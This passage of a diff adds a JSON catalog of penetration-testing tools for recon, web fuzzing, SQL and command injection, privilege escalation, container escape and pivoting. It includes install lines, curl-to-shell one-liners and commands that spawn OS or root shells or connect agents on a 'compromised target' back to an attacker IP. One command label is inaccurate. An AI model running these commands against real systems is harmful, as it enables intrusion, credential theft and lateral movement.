+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology/source-code-review-sast"
+      },
+      {
+        "title": "Medium - Finding High Value API Keys with TruffleHog",
+        "url": "https://medium.com/@trufflesecurity/introducing-trufflehog-v3"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan GitHub Organization",
+        "cmd": "trufflehog github --org=TargetOrg --only-verified"
+      },
+      {
+        "label": "Scan Local Git Repository",
+        "cmd": "trufflehog git file://./my-repo"
+      }
+    ],
+    "notes": "The `--only-verified` flag actively verifies whether discovered API keys (AWS, Slack, GitHub, Stripe) are currently active and live."
+  },
+  {
+    "id": "favfreak",
+    "name": "FavFreak",
+    "tagline": "Favicon hash generator and origin IP unmasker via Shodan & Censys",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "rare",
+    "purpose_summary": "Calculate MurmurHash of website favicon.ico files to identify hidden cloud assets, backend origin servers, and WAF-bypassed IPs across Shodan.",
+    "purposes": [
+      "unmask origin ip behind cloudflare",
+      "favicon murmurhash lookup",
+      "shodan asset correlation",
+      "bypass waf origin discovery"
+    ],
+    "distros": {
+      "blackarch": "pacman -S favfreak",
+      "arch": "yay -S favfreak-git",
+      "debian": "git clone https://github.com/devanshbatham/FavFreak.git && cd FavFreak && pip install -r requirements.txt",
+      "git": "git clone https://github.com/devanshbatham/FavFreak.git && cd FavFreak && pip install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/devanshbatham/FavFreak",
+    "repo_type": "github",
+    "official_url": "https://github.com/devanshbatham/FavFreak",
+    "research_links": [
+      {
+        "title": "HackTricks - Bypassing Cloudflare & CDN with Favicon",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/unmasking-proxies-cloud-waf"
+      },
+      {
+        "title": "Medium - Unmasking Origin IPs with Favicon Hashes",
+        "url": "https://medium.com/@devanshbatham/favfreak-making-recon-easier"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Hash URLs from File",
+        "cmd": "cat urls.txt | python3 favfreak.py -o favicons_out"
+      },
+      {
+        "label": "Query Shodan with Hash",
+        "cmd": "shodan search 'http.favicon.hash:<MURMUR_HASH>'"
+      }
+    ],
+    "notes": "Underground bug bounty favorite for finding direct backend origin servers behind Cloudflare / Akamai."
+  },
+  {
+    "id": "cloudfail",
+    "name": "CloudFail",
+    "tagline": "Unmask backend IP addresses hidden behind Cloudflare protection",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "rare",
+    "purpose_summary": "Discover real server IP addresses protected by Cloudflare using historical DNS records, misconfigured subdomains, and Crimeflare databases.",
+    "purposes": [
+      "bypass cloudflare ip",
+      "find real ip behind cdn",
+      "unmask origin server",
+      "dns history origin lookup"
+    ],
+    "distros": {
+      "blackarch": "pacman -S cloudfail",
+      "arch": "yay -S cloudfail-git",
+      "debian": "git clone https://github.com/m0rt3m/CloudFail.git && cd CloudFail && pip3 install -r requirements.txt",
+      "git": "git clone https://github.com/m0rt3m/CloudFail.git && cd CloudFail && pip3 install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/m0rt3m/CloudFail",
+    "repo_type": "github",
+    "official_url": "https://github.com/m0rt3m/CloudFail",
+    "research_links": [
+      {
+        "title": "HackTricks - Bypassing Cloudflare",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/unmasking-proxies-cloud-waf"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Find Real IP of Cloudflare Site",
+        "cmd": "python3 cloudfail.py --target target.com"
+      }
+    ],
+    "notes": "Checks DNSdumpster, Crimeflare, and old misconfigured subdomains (mail, direct, cpanel, ftp)."
+  },
+  {
+    "id": "theharvester",
+    "name": "theHarvester",
+    "tagline": "Gather emails, subdomains, hosts, employee names, and open ports",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "popular",
+    "purpose_summary": "Perform targeted intelligence gathering against a domain using public search engines (Google, Bing, Yahoo), PGP servers, Baidu, and LinkedIn.",
+    "purposes": [
+      "harvest employee emails osint",
+      "subdomain discovery search engines",
+      "linkedin employee scraper",
+      "passive reconnaissance emails"
+    ],
+    "distros": {
+      "blackarch": "pacman -S theharvester",
+      "arch": "pacman -S theharvester || yay -S theharvester",
+      "debian": "sudo apt install theharvester -y",
+      "git": "git clone https://github.com/laramies/theHarvester.git && cd theHarvester && pip install -r requirements/base.txt"
+    },
+    "repo_url": "https://github.com/laramies/theHarvester",
+    "repo_type": "github",
+    "official_url": "https://github.com/laramies/theHarvester",
+    "research_links": [
+      {
+        "title": "theHarvester Documentation",
+        "url": "https://github.com/laramies/theHarvester/wiki"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Search All Public Sources",
+        "cmd": "theHarvester -d target.com -b all -l 500 -f target_osint.html"
+      }
+    ],
+    "notes": "Classic OSINT tool for building targeted phishing and password spray lists."
+  },
+  {
+    "id": "sherlock",
+    "name": "Sherlock",
+    "tagline": "Hunt down social media accounts by username across 400+ networks",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "popular",
+    "purpose_summary": "Locate an individual across hundreds of social networks, forums, GitHub, Reddit, Telegram, TikTok, and technical sites using their username.",
+    "purposes": [
+      "username osint lookup",
+      "find social accounts by handle",
+      "person of interest tracking",
+      "cross platform handle search"
+    ],
+    "distros": {
+      "blackarch": "pacman -S sherlock",
+      "arch": "yay -S sherlock",
+      "debian": "sudo apt install sherlock -y || pipx install sherlock-project",
+      "git": "git clone https://github.com/sherlock-project/sherlock.git && cd sherlock && python3 -m pip install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/sherlock-project/sherlock",
+    "repo_type": "github",
+    "official_url": "https://sherlock-project.github.io/",
+    "research_links": [
+      {
+        "title": "Sherlock Official GitHub Guide",
+        "url": "https://github.com/sherlock-project/sherlock"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Hunt Single Handle Across All Sites",
+        "cmd": "sherlock target_handle --timeout 5 --print-found"
+      },
+      {
+        "label": "Export Results to CSV",
+        "cmd": "sherlock target_handle --csv"
+      }
+    ],
+    "notes": "Multithreaded, fast, and constantly updated with new platform patterns."
+  },
+  {
+    "id": "ffuf",
+    "name": "FFUF (Fuzz Faster U Fool)",
+    "tagline": "Blazingly fast web fuzzer written in Go for paths, parameters & virtual hosts",
+    "category": "Web Application & API Security",
+    "rarity": "popular",
+    "purpose_summary": "Perform high-speed directory discovery, parameter fuzzing, virtual host discovery, POST data injection, and auth brute forcing.",
+    "purposes": [
+      "directory busting web fuzzer",
+      "vhost virtual host discovery",
+      "parameter discovery fuzzing",
+      "fastest web fuzzing go",
+      "bypass 403 endpoints"
+    ],
+    "distros": {
+      "blackarch": "pacman -S ffuf",
+      "arch": "pacman -S ffuf || yay -S ffuf",
+      "debian": "sudo apt install ffuf -y || go install github.com/ffuf/ffuf/v2@latest",
+      "git": "git clone https://github.com/ffuf/ffuf.git && cd ffuf && go build"
+    },
+    "repo_url": "https://github.com/ffuf/ffuf",
+    "repo_type": "github",
+    "official_url": "https://github.com/ffuf/ffuf",
+    "research_links": [
+      {
+        "title": "FFUF Official GitHub & Guide",
+        "url": "https://github.com/ffuf/ffuf"
+      },
+      {
+        "title": "HackTricks - FFUF Cheatsheet & Tips",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/ffuf"
+      },
+      {
+        "title": "Medium - Everything You Need to Know About FFUF",
+        "url": "https://medium.com/@codingo/ffuf-the-missing-manual"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Directory Fuzzing with Filter",
+        "cmd": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 404"
+      },
+      {
+        "label": "Virtual Host / Subdomain Fuzzing",
+        "cmd": "ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt -fs 4242"
+      },
+      {
+        "label": "POST Parameter Fuzzing",
+        "cmd": "ffuf -u https://target.com/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt -mr 'Welcome'"
+      }
+    ],
+    "notes": "Super fast, lightweight, and versatile. Use `-ac` for auto-calibrating filters to ignore noise."
+  },
+  {
+    "id": "sqlmap",
+    "name": "SQLMap",
+    "tagline": "Automatic SQL injection and database takeover engine",
+    "category": "Web Application & API Security",
+    "rarity": "popular",
+    "purpose_summary": "Detect and exploit SQL injection vulnerabilities in web applications, dump databases, crack hashes, read/write files, and spawn OS shells.",
+    "purposes": [
+      "sql injection automatic exploitation",
+      "dump database tables",
+      "blind sqli time based",
+      "extract database credentials",
+      "os shell via sql injection"
+    ],
+    "distros": {
+      "blackarch": "pacman -S sqlmap",
+      "arch": "pacman -S sqlmap || yay -S sqlmap",
+      "debian": "sudo apt install sqlmap -y",
+      "git": "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev"
+    },
+    "repo_url": "https://github.com/sqlmapproject/sqlmap",
+    "repo_type": "github",
+    "official_url": "https://sqlmap.org/",
+    "research_links": [
+      {
+        "title": "SQLMap User Manual & Cheat Sheet",
+        "url": "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
+      },
+      {
+        "title": "HackTricks - SQL Injection Exploitation",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/sql-injection"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan Request File from Burp",
+        "cmd": "sqlmap -r request.req --batch --dbs --level=3 --risk=2"
+      },
+      {
+        "label": "Dump Database Tables",
+        "cmd": "sqlmap -u 'https://target.com/item?id=1' -D target_db --dump"
+      },
+      {
+        "label": "Spawn OS Shell via SQLi",
+        "cmd": "sqlmap -r request.req --os-shell"
+      }
+    ],
+    "notes": "Supports tamper scripts (`--tamper=space2comment,randomcase`) for bypassing modern WAFs."
+  },
+  {
+    "id": "kiterunner",
+    "name": "Kiterunner",
+    "tagline": "Contextual, content-aware API endpoint discovery tool for REST & GraphQL",
+    "category": "Web Application & API Security",
+    "rarity": "rare",
+    "purpose_summary": "Discover hidden API routes and endpoints by reconstructing API structures using large datasets of real-world API schemas (Swagger, OpenAPI).",
+    "purposes": [
+      "api endpoint discovery",
+      "rest api brute force",
+      "graphql hidden endpoints",
+      "api wordlist fuzzer",
+      "swagger api route hunting"
+    ],
+    "distros": {
+      "blackarch": "pacman -S kiterunner",
+      "arch": "yay -S kiterunner-bin",
+      "debian": "go install github.com/assetnote/kiterunner@latest || wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_amd64.tar.gz",
+      "git": "git clone https://github.com/assetnote/kiterunner.git && cd kiterunner && make build"
+    },
+    "repo_url": "https://github.com/assetnote/kiterunner",
+    "repo_type": "github",
+    "official_url": "https://github.com/assetnote/kiterunner",
+    "research_links": [
+      {
+        "title": "Assetnote Blog - Introducing Kiterunner API Fuzzing",
+        "url": "https://blog.assetnote.io/2021/04/05/contextual-content-discovery-kiterunner/"
+      },
+      {
+        "title": "HackTricks - API Pentesting & Wordlists",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan Target with Assetnote Wordlist",
+        "cmd": "kr scan https://api.target.com -w routes-large.kite -x 20"
+      },
+      {
+        "label": "Bruteforce API Base Prefixes",
+        "cmd": "kr brute https://target.com -w api_wordlist.txt -A=apiroutes-210228"
+      }
+    ],
+    "notes": "Far superior to traditional wordlists for APIs because it tests HTTP methods (POST, PUT, GET) alongside route prefixes like /api/v1/."
+  },
+  {
+    "id": "dalfox",
+    "name": "Dalfox",
+    "tagline": "Fast, powerful parameter analysis and XSS scanner written in Go",
+    "category": "Web Application & API Security",
+    "rarity": "popular",
+    "purpose_summary": "Find reflected, stored, and DOM-based Cross-Site Scripting (XSS) vulnerabilities with headless browser verification and WAF bypass logic.",
+    "purposes": [
+      "cross site scripting scanner",
+      "xss scanner automated",
+      "dom xss detection",
+      "parameter analysis xss",
+      "waf bypass xss"
+    ],
+    "distros": {
+      "blackarch": "pacman -S dalfox",
+      "arch": "yay -S dalfox-bin",
+      "debian": "go install github.com/hahwul/dalfox/v2@latest",
+      "git": "git clone https://github.com/hahwul/dalfox.git && cd dalfox && go build"
+    },
+    "repo_url": "https://github.com/hahwul/dalfox",
+    "repo_type": "github",
+    "official_url": "https://dalfox.hahwul.com/",
+    "research_links": [
+      {
+        "title": "Dalfox Official Documentation",
+        "url": "https://dalfox.hahwul.com/"
+      },
+      {
+        "title": "HackTricks - Cross Site Scripting (XSS)",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-cross-site-scripting"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan URL for XSS",
+        "cmd": "dalfox url 'https://target.com/page?q=test' --silence"
+      },
+      {
+        "label": "Pipe URLs from Katana / Waybacks",
+        "cmd": "cat urls.txt | dalfox pipe -o xss_vulns.txt"
+      }
+    ],
+    "notes": "Very low false-positive rate due to its intelligent DOM verification."
+  },
+  {
+    "id": "arjun",
+    "name": "Arjun",
+    "tagline": "HTTP parameter discovery suite for uncovering hidden injection points",
+    "category": "Web Application & API Security",
+    "rarity": "popular",
+    "purpose_summary": "Find query string, POST body, and JSON parameters on web pages that are not linked in the HTML, opening doors to hidden SSRF, SQLi, and IDORs.",
+    "purposes": [
+      "hidden parameter discovery",
+      "uncover query params",
+      "find json parameters",
+      "ssrf parameter discovery",
+      "idor entry point discovery"
+    ],
+    "distros": {
+      "blackarch": "pacman -S arjun",
+      "arch": "yay -S arjun",
+      "debian": "pipx install arjun || pip install arjun",
+      "git": "git clone https://github.com/s0md3v/Arjun.git && cd Arjun && pip install ."
+    },
+    "repo_url": "https://github.com/s0md3v/Arjun",
+    "repo_type": "github",
+    "official_url": "https://github.com/s0md3v/Arjun",
+    "research_links": [
+      {
+        "title": "HackTricks - Parameter Discovery",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/parameter-fuzzing"
+      },
+      {
+        "title": "Medium - Finding Hidden Vulns with Arjun",
+        "url": "https://medium.com/@s0md3v/hunting-parameters-with-arjun"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Discover GET Parameters",
+        "cmd": "arjun -u https://target.com/api/user -m GET"
+      },
+      {
+        "label": "Discover JSON Parameters",
+        "cmd": "arjun -u https://target.com/profile -m JSON --passive"
+      }
+    ],
+    "notes": "Handles rate limiting and adaptive timeout delays automatically."
+  },
+  {
+    "id": "paramspider",
+    "name": "ParamSpider",
+    "tagline": "Mine URL parameters from the dark corners of the Wayback Machine",
+    "category": "Web Application & API Security",
+    "rarity": "rare",
+    "purpose_summary": "Extract thousands of historical parameterized URLs from Wayback Machine, Common Crawl, and AlienVault for mining SQLi, XSS, and SSRF parameters.",
+    "purposes": [
+      "wayback machine parameter scraper",
+      "mine juicy parameters",
+      "passive parameter collection",
+      "find forgotten endpoints"
+    ],
+    "distros": {
+      "blackarch": "pacman -S paramspider",
+      "arch": "yay -S paramspider-git",
+      "debian": "pipx install git+https://github.com/devanshbatham/paramspider || git clone https://github.com/devanshbatham/ParamSpider.git && cd ParamSpider && pip install .",
+      "git": "git clone https://github.com/devanshbatham/ParamSpider.git && cd ParamSpider && pip install ."
+    },
+    "repo_url": "https://github.com/devanshbatham/ParamSpider",
+    "repo_type": "github",
+    "official_url": "https://github.com/devanshbatham/ParamSpider",
+    "research_links": [
+      {
+        "title": "Medium - Bug Bounty Hunting with ParamSpider",
+        "url": "https://medium.com/@devanshbatham/mining-urls-with-paramspider"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scrape Target Domain Params",
+        "cmd": "paramspider -d target.com --subs"
+      },
+      {
+        "label": "Filter Out Static Extensions (jpg, png, css)",
+        "cmd": "paramspider -d target.com --exclude jpg,png,css,woff"
+      }
+    ],
+    "notes": "Underground bug bounty goldmine. Generates URLs with clean placeholder tokens (e.g. `?id=FUZZ`) ready to feed straight into SQLMap or Dalfox."
+  },
+  {
+    "id": "commix",
+    "name": "Commix",
+    "tagline": "Automated command injection and exploitation engine",
+    "category": "Web Application & API Security",
+    "rarity": "popular",
+    "purpose_summary": "Automate the detection and exploitation of command injection vulnerabilities, popping reverse shells and spawning native interactive shells.",
+    "purposes": [
+      "command injection exploitation",
+      "rce web vulnerability scanner",
+      "blind command injection",
+      "spawn root shell command injection"
+    ],
+    "distros": {
+      "blackarch": "pacman -S commix",
+      "arch": "pacman -S commix || yay -S commix",
+      "debian": "sudo apt install commix -y",
+      "git": "git clone https://github.com/commixproject/commix.git commix && cd commix"
+    },
+    "repo_url": "https://github.com/commixproject/commix",
+    "repo_type": "github",
+    "official_url": "https://commixproject.com/",
+    "research_links": [
+      {
+        "title": "HackTricks - Command Injection",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/command-injection"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan HTTP Request for Command Injection",
+        "cmd": "python3 commix.py -r request.req --batch"
+      },
+      {
+        "label": "Spawn Reverse Shell on Vulnerable Target",
+        "cmd": "python3 commix.py -u 'http://target.com/vuln.php?cmd=test' --os-cmd='whoami'"
+      }
+    ],
+    "notes": "The SQLMap equivalent for OS command injection vulnerabilities."
+  },
+  {
+    "id": "smuggler",
+    "name": "Smuggler",
+    "tagline": "HTTP Request Smuggling scanner written in Python",
+    "category": "Web Application & API Security",
+    "rarity": "rare",
+    "purpose_summary": "Detect CL:TE, TE:CL, and TE:TE HTTP Request Smuggling vulnerabilities on reverse proxies, load balancers, and CDN architectures.",
+    "purposes": [
+      "http request smuggling detection",
+      "cl te desync attack",
+      "bypass frontend proxy cache",
+      "desync request poisoning"
+    ],
+    "distros": {
+      "blackarch": "pacman -S smuggler",
+      "arch": "yay -S smuggler-git",
+      "debian": "git clone https://github.com/defparam/smuggler.git && cd smuggler",
+      "git": "git clone https://github.com/defparam/smuggler.git && cd smuggler"
+    },
+    "repo_url": "https://github.com/defparam/smuggler",
+    "repo_type": "github",
+    "official_url": "https://github.com/defparam/smuggler",
+    "research_links": [
+      {
+        "title": "HackTricks - HTTP Request Smuggling Complete Guide",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/http-request-smuggling"
+      },
+      {
+        "title": "PortSwigger - HTTP Request Smuggling Research",
+        "url": "https://portswigger.net/web-security/request-smuggling"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan Single Target",
+        "cmd": "python3 smuggler.py -u https://target.com/"
+      },
+      {
+        "label": "Scan Host List with Exhaustive Payloads",
+        "cmd": "python3 smuggler.py -u https://target.com/ -m POST --log results.log"
+      }
+    ],
+    "notes": "Tests 30+ transfer-encoding mutations and permutations that trip up proxies."
+  },
+  {
+    "id": "linpeas",
+    "name": "LinPEAS",
+    "tagline": "Linux Privilege Escalation Awesome Script (PEASS-ng)",
+    "category": "Privilege Escalation & Local Enumeration",
+    "rarity": "popular",
+    "purpose_summary": "Scan Linux systems for misconfigurations, weak permissions, SUID binaries, kernel exploits, sudo tokens, credentials, and cron jobs.",
+    "purposes": [
+      "linux privilege escalation audit",
+      "find suid binaries",
+      "sudo token abuse",
+      "cron job privesc",
+      "kernel exploit detector",
+      "find root passwords linux"
+    ],
+    "distros": {
+      "blackarch": "pacman -S peass",
+      "arch": "yay -S linpeas",
+      "debian": "sudo apt install peass || curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",
+      "git": "git clone https://github.com/peass-ng/PEASS-ng.git && cd PEASS-ng/linPEAS"
+    },
+    "repo_url": "https://github.com/peass-ng/PEASS-ng",
+    "repo_type": "github",
+    "official_url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation",
+    "research_links": [
+      {
+        "title": "HackTricks - Linux Privilege Escalation Bible",
+        "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
+      },
+      {
+        "title": "PayloadsAllTheThings - Linux Privilege Escalation",
+        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "One-Liner In-Memory Run",
+        "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+      },
+      {
+        "label": "Save to Local Log",
+        "cmd": "./linpeas.sh -a > /tmp/linpeas_report.txt"
+      },
+      {
+        "label": "Color Code Guide",
+        "cmd": "# RED/YELLOW text highlights 99% guaranteed privilege escalation vectors!"
+      }
+    ],
+    "notes": "The undisputed gold standard for Linux local privilege escalation. High contrast color highlights make root vectors stand out."
+  },
+  {
+    "id": "winpeas",
+    "name": "WinPEAS",
+    "tagline": "Windows Privilege Escalation Awesome Scripts (PEASS-ng)",
+    "category": "Privilege Escalation & Local Enumeration",
+    "rarity": "popular",
+    "purpose_summary": "Enumerate unquoted service paths, always install elevated, stored credentials, registry autologons, DPAPI tokens, and token privileges on Windows.",
+    "purposes": [
+      "windows privilege escalation",
+      "unquoted service path privesc",
+      "alwaysinstallelevated exploit",
+      "extract stored windows creds",
+      "seh service permission abuse"
+    ],
+    "distros": {
+      "blackarch": "pacman -S peass",
+      "arch": "yay -S peass-git",
+      "debian": "wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe",
+      "git": "git clone https://github.com/peass-ng/PEASS-ng.git && cd PEASS-ng/winPEAS"
+    },
+    "repo_url": "https://github.com/peass-ng/PEASS-ng",
+    "repo_type": "github",
+    "official_url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation",
+    "research_links": [
+      {
+        "title": "HackTricks - Windows Local Privilege Escalation",
+        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Run Fast Check",
+        "cmd": "winPEASx64.exe quiet cmd fast"
+      },
+      {
+        "label": "Color Output in CMD",
+        "cmd": "REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f\nwinPEASx64.exe"
+      }
+    ],
+    "notes": "Available as a .bat script and compiled .NET executable. Automatically detects DLL hijacking and writable service binaries."
+  },
+  {
+    "id": "traitor",
+    "name": "Traitor",
+    "tagline": "Automatic Linux privilege escalation via low-hanging fruit and SUID exploits",
+    "category": "Privilege Escalation & Local Enumeration",
+    "rarity": "rare",
+    "purpose_summary": "Automatically discovers and exploits local Linux privilege escalation vectors (sudo rights, GTFOBins, docker group, writable files) to pop an instant root shell.",
+    "purposes": [
+      "auto root exploit linux",
+      "gtfobins auto exploiter",
+      "docker group root escape",
+      "sudo nopasswd auto shell",
+      "automated privesc exploit"
+    ],
+    "distros": {
+      "blackarch": "pacman -S traitor",
+      "arch": "yay -S traitor-bin",
+      "debian": "wget https://github.com/liamg/traitor/releases/latest/download/traitor-amd64 && chmod +x traitor-amd64",
+      "git": "git clone https://github.com/liamg/traitor.git && cd traitor && go build -ldflags=\"-s -w\" ."
+    },
+    "repo_url": "https://github.com/liamg/traitor",
+    "repo_type": "github",
+    "official_url": "https://github.com/liamg/traitor",
+    "research_links": [
+      {
+        "title": "HackTricks - GTFOBins Exploitation",
+        "url": "https://gtfobins.github.io/"
+      },
+      {
+        "title": "Medium - Instant Root with Traitor",
+        "url": "https://medium.com/@liamg/traitor-automatically-pwn-linux-boxes"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Audit Exploit Vectors",
+        "cmd": "./traitor-amd64 -p"
+      },
+      {
+        "label": "Auto-Exploit Best Vector to Root",
+        "cmd": "./traitor-amd64 -a"
+      }
+    ],
+    "notes": "Rare Go binary that doesn't just enumerate—it actually spawns the root shell directly if an exploit is found."
+  },
+  {
+    "id": "deepce",
+    "name": "Deepce (Docker Enumeration, Escalation & Container Escape)",
+    "tagline": "Ultimate Docker container privilege escalation and breakout tool",
+    "category": "Privilege Escalation & Local Enumeration",
+    "rarity": "rare",
+    "purpose_summary": "Enumerate Docker environments from inside a container, detect mounted docker sockets, sensitive host mounts, privileged flags, and escape to the host root.",
+    "purposes": [
+      "docker container breakout",
+      "escape docker to host",
+      "docker socket privilege escalation",
+      "privileged container exploit",
+      "container escape script"
+    ],
+    "distros": {
+      "blackarch": "pacman -S deepce",
+      "arch": "yay -S deepce-git",
+      "debian": "curl -sL https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh",
+      "git": "git clone https://github.com/stealthcopter/deepce.git && cd deepce"
+    },
+    "repo_url": "https://github.com/stealthcopter/deepce",
+    "repo_type": "github",
+    "official_url": "https://stealthcopter.github.io/deepce/",
+    "research_links": [
+      {
+        "title": "HackTricks - Docker Container Breakout",
+        "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
+      },
+      {
+        "title": "Medium - Deepce: Container Exploitation Guide",
+        "url": "https://medium.com/@stealthcopter/deepce-docker-privilege-escalation"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Run Deepce Enum",
+        "cmd": "sh -c \"$(curl -fsSL https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh)\""
+      },
+      {
+        "label": "Auto-Escape via Mounted Docker Socket",
+        "cmd": "./deepce.sh --exploit /var/run/docker.sock"
+      }
+    ],
+    "notes": "Standalone shell script with zero dependencies, runs flawlessly in minimal Alpine/Debian Docker containers."
+  },
+  {
+    "id": "ligolo-ng",
+    "name": "Ligolo-ng",
+    "tagline": "Advanced, high-performance tunneling/pivoting tool using TUN interfaces",
+    "category": "Pivoting, Tunneling & Proxies",
+    "rarity": "popular",
+    "purpose_summary": "Establish seamless network pivots using a virtual TUN interface, routing entire subnets without needing SOCKS proxies or proxychains.",
+    "purposes": [
+      "pivoting internal network",
+      "tun interface tunnel",
+      "better than proxychains",
+      "internal network routing",
+      "fast reverse tunnel"
+    ],
+    "distros": {
+      "blackarch": "pacman -S ligolo-ng",
+      "arch": "yay -S ligolo-ng-bin",
+      "debian": "wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz && tar -zxvf ligolo-ng_proxy_linux_amd64.tar.gz",
+      "git": "git clone https://github.com/nicocha30/ligolo-ng.git && cd ligolo-ng && go build -o proxy cmd/proxy/main.go && go build -o agent cmd/agent/main.go"
+    },
+    "repo_url": "https://github.com/nicocha30/ligolo-ng",
+    "repo_type": "github",
+    "official_url": "https://github.com/nicocha30/ligolo-ng",
+    "research_links": [
+      {
+        "title": "HackTricks - Ligolo-ng Pivoting Guide",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding/ligolo-ng"
+      },
+      {
+        "title": "Medium - Ditch Proxychains! Mastering Ligolo-ng",
+        "url": "https://medium.com/@infosec/ligolo-ng-the-modern-pivoting-tool"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Setup TUN Interface on Attacker Box",
+        "cmd": "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up"
+      },
+      {
+        "label": "Start Proxy Server",
+        "cmd": "./proxy -selfcert -laddr 0.0.0.0:11601"
+      },
+      {
+        "label": "Run Agent on Compromised Target",
+        "cmd": "./agent -connect 10.10.14.5:11601 -ignore-cert"
+      }
+    ],
+    "notes": "Game changer for internal network engagements. Allows tools like Nmap SYN scans, crackmapexec, and browser to reach internal target subnets directly."
+  },
+  {
+    "id": "chisel",
+    "name": "Chisel",
+    "tagline": "Fast TCP/UDP tunnel over HTTP secured via SSH encryption",
+    "category": "Pivoting, Tunneling & Proxies",
+    "rarity": "popular",
+    "purpose_summary": "Create reverse and forward TCP/UDP tunnels and reverse SOCKS5 proxies disguised as legitimate HTTP/WebSocket traffic through strict firewalls.",
+    "purposes": [
+      "socks5 reverse proxy",
+      "http websocket tunnel",
+      "bypass outbound firewall",
+      "port forwarding internal host"
+    ],
+    "distros": {
+      "blackarch": "pacman -S chisel",
+      "arch": "pacman -S chisel || yay -S chisel",
+      "debian": "sudo apt install chisel -y || go install github.com/jpillora/chisel@latest",
+      "git": "git clone https://github.com/jpillora/chisel.git && cd chisel && go build -ldflags=\"-s -w\" ."
+    },
+    "repo_url": "https://github.com/jpillora/chisel",
+    "repo_type": "github",
+    "official_url": "https://github.com/jpillora/chisel",
+    "research_links": [
+      {
+        "title": "HackTricks - Chisel Port Forwarding & Pivoting",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#chisel"
+      },
+      {
+        "title": "Medium - A Guide to Tunneling with Chisel",
+        "url": "https://medium.com/@0xZippo/chisel-pivoting-guide"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Start Server on Kali/Debian",
+        "cmd": "chisel server -p 8000 --reverse"
+      },
+      {
+        "label": "Connect Client to Spawn Reverse SOCKS5",
+        "cmd": "chisel client 10.10.14.5:8000 R:socks"
+      }
+    ],
+    "notes": "Single static binary available for Linux, Windows, macOS, and ARM. Extremely stable over high-latency connections."
+  },
+  {
+    "id": "neo-regeorg",
+    "name": "Neo-reGeorg",
+    "tagline": "SOCKS5 tunneling over HTTP web shells (PHP, JSP, ASPX)",
+    "category": "Pivoting, Tunneling & Proxies",
+    "rarity": "rare",
+    "purpose_summary": "Establish a SOCKS5 proxy into an internal network when you only have a web shell uploaded to a web server (no reverse shells permitted by egress firewall).",
+    "purposes": [
+      "socks proxy over php webshell",
+      "tunneling over http 80 443",
+      "regeorg successor",
+      "egress firewall bypass pivot"
+    ],
+    "distros": {
+      "blackarch": "pacman -S neo-regeorg",
+      "arch": "yay -S neo-regeorg-git",
+      "debian": "git clone https://github.com/L-codes/Neo-reGeorg.git && cd Neo-reGeorg && pip3 install -r requirements.txt",
